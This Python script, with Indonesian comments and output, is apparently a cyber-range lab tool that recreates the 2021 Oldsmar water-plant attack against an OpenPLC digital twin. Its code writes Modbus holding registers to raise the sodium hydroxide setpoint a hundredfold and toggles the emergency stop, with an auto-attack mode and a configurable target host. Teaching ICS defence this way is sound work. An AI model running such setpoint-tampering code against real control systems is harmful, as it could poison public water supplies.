#!/usr/bin/env python3
"""
ICSSI Digital Twin - Oldsmar WWTP Attack Simulation
====================================================
Simulasi serangan Oldsmar Water Treatment Plant (8 Februari 2021)

SKENARIO SERANGAN:
  Penyerang mendapatkan akses remote ke SCADA/HMI sistem WWTP kota Oldsmar, Florida.
  Mereka mengubah setpoint sodium hydroxide (NaOH/lye) dari 111 ppm menjadi 11,100 ppm
  -- peningkatan 100x lipat yang berpotensi meracuni pasokan air kota --
  dalam waktu kurang dari 5 menit. Operator menemukan dan membalik perubahan tersebut.

TUJUAN LAB:
  1. Memahami dampak akses tidak sah ke sistem kontrol industri
  2. Melatih deteksi anomali setpoint
  3. Memahami pentingnya network segmentation & authentication pada ICS

Jalankan:
  python oldsmar_attack.py                    # mode interaktif
  python oldsmar_attack.py --mode auto        # otomatis (langsung serang)
  python oldsmar_attack.py --mode restore     # pulihkan ke nilai normal
  python oldsmar_attack.py --host 192.168.x.x # target IP berbeda

PERINGATAN: HANYA UNTUK PENGGUNAAN DI ICS CYBER RANGE / LAB PENDIDIKAN.
"""

import asyncio
import argparse
import sys
import time
import os
from datetime import datetime

from pymodbus.client import AsyncModbusTcpClient

# ── Konstanta ──────────────────────────────────────────────────────────────────
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 502   # OpenPLC Modbus TCP (gunakan --port 5020 untuk direct ke sensor server)

# ── OpenPLC base addresses (slave device pertama, offset 100) ──────────────────
# %IW100-%IW110 → Modbus Input Register  address 100
# %QW100-%QW103 → Modbus Holding Register address 100
# %QX100.0-100.4→ Modbus Coil address 800 (byte×8+bit = 100×8+0)
_IR_BASE   = 100
_HR_BASE   = 100
_COIL_BASE = 800

# Register offsets (relatif dari base) — sama dengan sensors/config.py
HR_NAOH_SETPOINT    = 0   # %QW100: NaOH setpoint (ppm, langsung, tidak di-scale)
HR_CHLORINE_SP      = 1   # %QW101: Chlorine setpoint (×100)
HR_FLOW_SETPOINT    = 2   # %QW102: Flow setpoint (L/min)
HR_PUMP_SPEED       = 3   # %QW103: Pump speed (%)

COIL_MAIN_PUMP      = 0   # %QX100.0
COIL_DOSING_PUMP    = 1   # %QX100.1
COIL_OUTLET_VALVE   = 2   # %QX100.2
COIL_ESTOP          = 3   # %QX100.3

IR_PH               = 0   # %IW100: pH ×100
IR_FLOW_IN          = 1   # %IW101
IR_NAOH_TANK        = 2   # %IW102
IR_WATER_LEVEL      = 3   # %IW103
IR_TURBIDITY        = 4   # %IW104
IR_TEMPERATURE      = 5   # %IW105
IR_CHLORINE         = 6   # %IW106
IR_PRESSURE         = 7   # %IW107
IR_NAOH_ACTUAL      = 8   # %IW108: NaOH aktual ×10
IR_ALARM_STATUS     = 9   # %IW109
IR_FLOW_OUT         = 10  # %IW110

# Nilai normal dan nilai serangan (HR NaOH setpoint langsung dalam ppm, tidak di-scale)
NORMAL_NAOH_SP   = 111     # 111 ppm  (nilai asli Oldsmar)
ATTACKED_NAOH_SP = 11100   # 11,100 ppm (nilai setelah serangan ×100, fits uint16)

# Warna ANSI
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"
    BG_RED = "\033[41m"
    BG_YEL = "\033[43m"
    BG_GRN = "\033[42m"


class OldsmarAttack:
    """Simulasi serangan Oldsmar WWTP."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.client = None

    async def connect(self) -> bool:
        self.client = AsyncModbusTcpClient(self.host, port=self.port)
        connected = await self.client.connect()
        return connected

    async def disconnect(self):
        if self.client:
            self.client.close()

    async def read_sensors(self) -> dict:
        """Baca semua sensor saat ini."""
        result = {}
        try:
            rr = await self.client.read_input_registers(address=_IR_BASE, count=11)
            if not rr.isError():
                regs = rr.registers
                result = {
                    "ph":           regs[IR_PH] / 100.0,
                    "flow_in":      regs[IR_FLOW_IN],
                    "naoh_tank":    regs[IR_NAOH_TANK],
                    "water_level":  regs[IR_WATER_LEVEL],
                    "turbidity":    regs[IR_TURBIDITY] / 10.0,
                    "temperature":  regs[IR_TEMPERATURE] / 10.0,
                    "chlorine":     regs[IR_CHLORINE] / 100.0,
                    "pressure":     regs[IR_PRESSURE] / 10.0,
                    "naoh_actual":  regs[IR_NAOH_ACTUAL] / 10.0,
                    "alarm":        regs[IR_ALARM_STATUS],
                    "flow_out":     regs[IR_FLOW_OUT],
                }
            hr = await self.client.read_holding_registers(address=_HR_BASE, count=4)
            if not hr.isError():
                result["naoh_setpoint"] = float(hr.registers[HR_NAOH_SETPOINT])  # langsung ppm
        except Exception as e:
            print(f"Error reading sensors: {e}")
        return result

    async def write_naoh_setpoint(self, value_ppm: int) -> bool:
        """Tulis NaOH setpoint (ppm, tidak di-scale) ke OpenPLC %QW100."""
        try:
            rr = await self.client.write_register(
                address=HR_NAOH_SETPOINT + _HR_BASE, value=value_ppm)
            return not rr.isError()
        except Exception as e:
            print(f"Error writing setpoint: {e}")
            return False

    async def trigger_estop(self, state: bool) -> bool:
        """Aktifkan/nonaktifkan emergency stop via OpenPLC %QX100.3."""
        try:
            rr = await self.client.write_coil(
                address=COIL_ESTOP + _COIL_BASE, value=state)
            return not rr.isError()
        except Exception as e:
            print(f"Error writing E-Stop: {e}")
            return False

    def print_sensor_table(self, sensors: dict, title: str = "STATUS SENSOR"):
        print(f"\n{C.BOLD}  {title}{C.RESET}")
        print(f"  {'Parameter':<20} {'Nilai':<15} {'Status'}")
        print(f"  {'-'*55}")

        rows = [
            ("pH",          f"{sensors.get('ph',0):.2f}",          sensors.get('ph',7) > 8.5 or sensors.get('ph',7) < 6.2),
            ("NaOH Aktual", f"{sensors.get('naoh_actual',0):.1f} ppm", sensors.get('naoh_actual',0) > 200),
            ("NaOH SP",     f"{sensors.get('naoh_setpoint',0):.1f} ppm", sensors.get('naoh_setpoint',0) > 200),
            ("Flow In",     f"{sensors.get('flow_in',0):.0f} L/min",  False),
            ("Water Level", f"{sensors.get('water_level',0):.0f} cm",  False),
            ("Turbidity",   f"{sensors.get('turbidity',0):.2f} NTU",  False),
            ("Temperature", f"{sensors.get('temperature',0):.1f} C",   False),
            ("Chlorine",    f"{sensors.get('chlorine',0):.2f} ppm",    False),
            ("Pressure",    f"{sensors.get('pressure',0):.1f} PSI",    False),
        ]

        for name, disp, is_alarm in rows:
            color = C.RED if is_alarm else C.GREEN
            status = "ALARM" if is_alarm else "OK"
            status_c = C.RED if is_alarm else C.GREEN
            print(f"  {name:<20} {color}{disp:<15}{C.RESET} {status_c}{status}{C.RESET}")

        if sensors.get("alarm", 0):
            print(f"\n  {C.BG_RED}{C.WHITE} ALARM AKTIF (bitmask={sensors['alarm']}) {C.RESET}")


async def run_interactive(host: str, port: int):
    """Mode interaktif dengan menu pilihan."""
    attack = OldsmarAttack(host, port)

    _header()

    print(f"\n{C.CYAN}Menghubungkan ke {host}:{port}...{C.RESET}")
    if not await attack.connect():
        print(f"{C.RED}GAGAL terhubung! Pastikan sensor_server.py berjalan.{C.RESET}")
        return

    print(f"{C.GREEN}Terhubung!{C.RESET}")

    while True:
        sensors = await attack.read_sensors()

        os.system("cls" if os.name == "nt" else "clear")
        _header()

        naoh_sp = sensors.get("naoh_setpoint", 0)
        is_under_attack = naoh_sp > 500

        if is_under_attack:
            print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD}")
            print(f"  !! SISTEM DALAM KONDISI SERANGAN !!                              ")
            print(f"  NaOH Setpoint: {naoh_sp:.0f} ppm (Normal: 111 ppm)              ")
            print(f"  Bahaya keracunan air minum!                                      ")
            print(f"{C.RESET}")
        else:
            print(f"\n{C.BG_GRN}{C.WHITE}  Sistem dalam kondisi NORMAL  {C.RESET}")

        attack.print_sensor_table(sensors)

        print(f"\n{C.BOLD}  MENU AKSI:{C.RESET}")
        print(f"  [1] Lakukan serangan Oldsmar (NaOH: 111 ppm -> 11,100 ppm)")
        print(f"  [2] Pulihkan ke kondisi normal (NaOH: 111 ppm)")
        print(f"  [3] Aktifkan Emergency Stop")
        print(f"  [4] Nonaktifkan Emergency Stop")
        print(f"  [5] Set NaOH setpoint manual")
        print(f"  [6] Refresh status")
        print(f"  [0] Keluar")

        try:
            choice = input(f"\n{C.YELLOW}  Pilihan: {C.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if choice == "1":
            await _do_attack(attack)
        elif choice == "2":
            await _do_restore(attack)
        elif choice == "3":
            ok = await attack.trigger_estop(True)
            print(f"  {C.RED}E-STOP {'diaktifkan' if ok else 'GAGAL'}{C.RESET}")
            await asyncio.sleep(2)
        elif choice == "4":
            ok = await attack.trigger_estop(False)
            print(f"  {C.GREEN}E-STOP {'dinonaktifkan' if ok else 'GAGAL'}{C.RESET}")
            await asyncio.sleep(2)
        elif choice == "5":
            try:
                val = input("  Masukkan NaOH setpoint (ppm): ").strip()
                ppm = int(float(val))
                ok = await attack.write_naoh_setpoint(ppm)
                color = C.GREEN if ok else C.RED
                print(f"  {color}NaOH setpoint {'diubah ke' if ok else 'GAGAL'} {ppm:.1f} ppm{C.RESET}")
            except ValueError:
                print(f"  {C.RED}Input tidak valid{C.RESET}")
            await asyncio.sleep(2)
        elif choice == "6":
            continue
        elif choice == "0":
            break

    await attack.disconnect()
    print(f"\n{C.YELLOW}Koneksi ditutup.{C.RESET}")


async def _do_attack(attack: OldsmarAttack):
    """Eksekusi serangan Oldsmar step-by-step dengan narasi."""
    print(f"\n{C.BG_RED}{C.WHITE}{C.BOLD}")
    print("  =====================================================")
    print("  SIMULASI SERANGAN OLDSMAR WWTP                      ")
    print("  Tanggal nyata: 8 Februari 2021, Oldsmar, Florida    ")
    print("  =====================================================")
    print(f"{C.RESET}")

    print(f"\n{C.YELLOW}[FASE 1] Penyerang mendapatkan akses ke sistem SCADA...{C.RESET}")
    await asyncio.sleep(1)
    print(f"         Menggunakan TeamViewer/Remote Desktop yang dikonfigurasi lemah")
    await asyncio.sleep(1)
    print(f"         No MFA, password lemah, tidak ada network segmentation")
    await asyncio.sleep(2)

    print(f"\n{C.YELLOW}[FASE 2] Membaca kondisi sistem saat ini...{C.RESET}")
    sensors = await attack.read_sensors()
    print(f"         pH saat ini    : {sensors.get('ph', 0):.2f}")
    print(f"         NaOH Aktual    : {sensors.get('naoh_actual', 0):.1f} ppm")
    print(f"         NaOH Setpoint  : {sensors.get('naoh_setpoint', 0):.1f} ppm")
    await asyncio.sleep(2)

    print(f"\n{C.RED}{C.BOLD}[FASE 3] MENGUBAH SETPOINT NaOH...{C.RESET}")
    print(f"         Normal  : 111.0 ppm (setpoint aman)")
    print(f"         Serangan: 11,100.0 ppm (100× lipat = BERBAHAYA)")
    await asyncio.sleep(1)

    ok = await attack.write_naoh_setpoint(ATTACKED_NAOH_SP)
    if ok:
        print(f"\n  {C.BG_RED}{C.WHITE}{C.BOLD}")
        print(f"  [!!] BERHASIL! NaOH setpoint diubah menjadi 11,100 ppm  ")
        print(f"  [!!] Sistem akan mulai memompa NaOH berlebih ke dalam air")
        print(f"{C.RESET}")
    else:
        print(f"  {C.RED}GAGAL menulis setpoint!{C.RESET}")
        return

    print(f"\n{C.YELLOW}[MONITORING] Memantau dampak selama 10 detik...{C.RESET}")
    for i in range(10):
        await asyncio.sleep(1)
        s = await attack.read_sensors()
        ph = s.get("ph", 0)
        naoh = s.get("naoh_actual", 0)
        ph_c = C.RED if ph > 8.5 else C.GREEN
        naoh_c = C.RED if naoh > 200 else C.YELLOW
        print(f"  t+{i+1:2}s  |  pH: {ph_c}{ph:.2f}{C.RESET}  |  NaOH: {naoh_c}{naoh:.0f} ppm{C.RESET}")

    print(f"\n{C.CYAN}Dalam skenario nyata: Operator pada hari itu melihat kursor mouse")
    print(f"bergerak sendiri dan segera mengembalikan setpoint secara manual.{C.RESET}")
    input(f"\n  {C.YELLOW}Tekan Enter untuk kembali ke menu...{C.RESET}")


async def _do_restore(attack: OldsmarAttack):
    """Pulihkan sistem ke kondisi normal."""
    print(f"\n{C.GREEN}[+] Memulihkan sistem ke kondisi normal...{C.RESET}")
    await attack.trigger_estop(False)
    await asyncio.sleep(0.5)
    ok = await attack.write_naoh_setpoint(NORMAL_NAOH_SP)
    if ok:
        print(f"  {C.GREEN}NaOH setpoint dikembalikan ke 111.0 ppm{C.RESET}")
        print(f"  {C.GREEN}Sistem dalam proses pemulihan...{C.RESET}")
    else:
        print(f"  {C.RED}GAGAL memulihkan setpoint!{C.RESET}")
    await asyncio.sleep(2)


async def run_auto_attack(host: str, port: int):
    """Mode otomatis: langsung lakukan serangan tanpa interaksi."""
    attack = OldsmarAttack(host, port)

    print(f"\n{C.CYAN}[AUTO] Menghubungkan ke {host}:{port}...{C.RESET}")
    if not await attack.connect():
        print(f"{C.RED}GAGAL terhubung!{C.RESET}")
        return

    print(f"{C.GREEN}[AUTO] Terhubung!{C.RESET}")
    await _do_attack(attack)
    await attack.disconnect()


async def run_restore(host: str, port: int):
    """Pulihkan sistem saja."""
    attack = OldsmarAttack(host, port)

    print(f"\n{C.CYAN}Menghubungkan ke {host}:{port}...{C.RESET}")
    if not await attack.connect():
        print(f"{C.RED}GAGAL terhubung!{C.RESET}")
        return

    await _do_restore(attack)
    await attack.disconnect()
    print(f"{C.GREEN}Selesai.{C.RESET}")


def _header():
    print(f"{C.BG_RED}{C.WHITE}{C.BOLD}")
    print("  ============================================================  ")
    print("  ICSSI CYBER RANGE - Simulasi Serangan Oldsmar WWTP           ")
    print("  HANYA UNTUK PENGGUNAAN PENDIDIKAN / ICS CYBER RANGE          ")
    print("  ============================================================  ")
    print(f"{C.RESET}")
    print(f"  {C.YELLOW}Referensi:{C.RESET} Serangan WWTP Oldsmar, Florida - 8 Feb 2021")
    print(f"  {C.YELLOW}Teknik:{C.RESET}    Akses remote tidak sah -> modifikasi setpoint SCADA")
    print(f"  {C.YELLOW}Dampak:{C.RESET}    NaOH setpoint 111 ppm -> 11,100 ppm (100x lipat)")


def main():
    parser = argparse.ArgumentParser(
        description="Simulasi Serangan Oldsmar WWTP - ICSSI Cyber Range"
    )
    parser.add_argument("--host", default=DEFAULT_HOST, help="IP sensor server / PLC")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Modbus TCP port")
    parser.add_argument(
        "--mode",
        choices=["interactive", "auto", "restore"],
        default="interactive",
        help="Mode: interactive (default), auto (langsung serang), restore (pulihkan)",
    )
    args = parser.parse_args()

    print(f"\n{C.BOLD}Target: {args.host}:{args.port}{C.RESET}")

    if args.mode == "interactive":
        asyncio.run(run_interactive(args.host, args.port))
    elif args.mode == "auto":
        asyncio.run(run_auto_attack(args.host, args.port))
    elif args.mode == "restore":
        asyncio.run(run_restore(args.host, args.port))


if __name__ == "__main__":
    main()
